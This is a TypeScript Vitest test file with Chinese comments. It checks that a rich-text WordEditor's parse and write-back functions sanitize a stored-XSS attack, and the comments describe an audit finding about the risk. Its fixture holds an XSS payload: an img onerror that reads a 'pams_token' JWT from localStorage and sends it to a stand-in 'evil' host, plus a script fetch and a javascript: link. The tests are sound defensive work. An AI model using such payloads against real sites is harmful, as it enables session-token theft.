// @vitest-environment jsdom
// 审计 #1 策划书富文本存储型 XSS：WordEditor 解析/回写边界必须净化。
// 攻击面：PUT /api/plans/{id} 把 purpose 等字段存成 <img onerror=...> 等恶意 HTML（后端落库无净化），
// 指导老师/主任打开策划书页时 parseDocSections 在挂载路径执行 frag.innerHTML = html，img onerror 触发外带 JWT。
// 断言：喂含 onerror / script / javascript: 的 HTML，净化后事件属性与脚本消失，正常格式（h1/h2、table、span style、img）保留。
// 净化必须走 DOMPurify（sanitizeEditableHtml），jsdom 环境下为真实净化而非正则兜底。
import { describe, it, expect } from 'vitest'
import { applyDocToState, buildDocHtml, parseDocSections } from './WordEditor'
import type { PlanFields, PlanOverrides } from './planTemplate'

const EMPTY: PlanFields = { background: '', purpose: '', content: '', flow: '', notice: '', emergency: '', budget: '' }
const NO_OV: PlanOverrides = {}

/** 模拟攻击者落库的恶意字段 HTML：img onerror 外带 + script + javascript: 协议链接 */
const XSS_PAYLOAD =
  `<p><img src=x onerror="new Image().src='https://evil/?c='+localStorage.getItem('pams_token')"></p>` +
  `<script>fetch('https://evil/x')</script>` +
  `<p><a href="javascript:alert(1)">链接</a></p>`

describe('WordEditor 解析/回写边界 XSS 净化（审计 #1）', () => {
  it('parseDocSections 剥离正文的事件属性与脚本及 javascript: 协议，保留 img/table 正常排版', () => {
    const secs = parseDocSections(
      `<h2>三、活动背景</h2><p>正常文本</p>${XSS_PAYLOAD}<table><tr><td>物品</td></tr></table>`,
    )
    expect(secs).toHaveLength(1)
    expect(secs[0].titleText).toBe('三、活动背景')
    const body = secs[0].bodyHtml
    expect(body).not.toContain('onerror')
    expect(body).not.toContain('localStorage')
    expect(body).not.toContain('<script')
    expect(body).not.toContain('javascript:')
    // 正常排版保留
    expect(body).toContain('正常文本')
    expect(body).toContain('<img')
    expect(body).toContain('<table')
    expect(body).toContain('链接')
  })

  it('parseDocSections 剥离章节标题 outerHTML 的事件属性，保留 h1 标题结构', () => {
    const secs = parseDocSections(`<h1><img src=x onerror="evil()">大标题</h1><p><span style="font-size:14pt">字号</span></p>`)
    expect(secs).toHaveLength(1)
    expect(secs[0].titleHtml).toContain('<h1')
    expect(secs[0].titleHtml).toContain('大标题')
    expect(secs[0].titleHtml).not.toContain('onerror')
    expect(secs[0].titleHtml).not.toContain('evil()')
    // 正文正常排版保留
    expect(secs[0].bodyHtml).toContain('font-size:14pt')
  })

  it('applyDocToState 回写字段正文时净化事件属性与脚本，保留链接文字', () => {
    const { fields } = applyDocToState(`<h2>四、活动目的</h2>${XSS_PAYLOAD}`, EMPTY, NO_OV)
    expect(fields.purpose).not.toContain('onerror')
    expect(fields.purpose).not.toContain('localStorage')
    expect(fields.purpose).not.toContain('<script')
    expect(fields.purpose).not.toContain('javascript:')
    expect(fields.purpose).toContain('链接')
  })

  it('applyDocToState 无章节标题兜底的自定义章节 contentHtml 同样被净化', () => {
    const { order } = applyDocToState(XSS_PAYLOAD, EMPTY, NO_OV)
    expect(order).toHaveLength(1)
    const content = order[0].contentHtml ?? ''
    expect(content).not.toContain('onerror')
    expect(content).not.toContain('localStorage')
    expect(content).not.toContain('<script')
    expect(content).not.toContain('javascript:')
  })

  it('buildDocHtml 拼进的恶意字段在挂载解析消费处（parseDocSections）被净化', () => {
    const doc = buildDocHtml({ ...EMPTY, purpose: XSS_PAYLOAD }, NO_OV, undefined, undefined)
    const secs = parseDocSections(doc)
    const purpose = secs.find((s) => s.titleText.includes('活动目的'))
    expect(purpose).toBeTruthy()
    expect(purpose!.bodyHtml).not.toContain('onerror')
    expect(purpose!.bodyHtml).not.toContain('localStorage')
    expect(purpose!.bodyHtml).not.toContain('<script')
    expect(purpose!.bodyHtml).not.toContain('javascript:')
    // 活动流程字段同一消费路径
    const docWithFlow = buildDocHtml({ ...EMPTY, flow: XSS_PAYLOAD }, NO_OV, undefined, undefined)
    const flow = parseDocSections(docWithFlow).find((s) => s.titleText.includes('活动流程'))
    expect(flow).toBeTruthy()
    expect(flow!.bodyHtml).not.toContain('onerror')
    expect(flow!.bodyHtml).not.toContain('<script')
  })
})
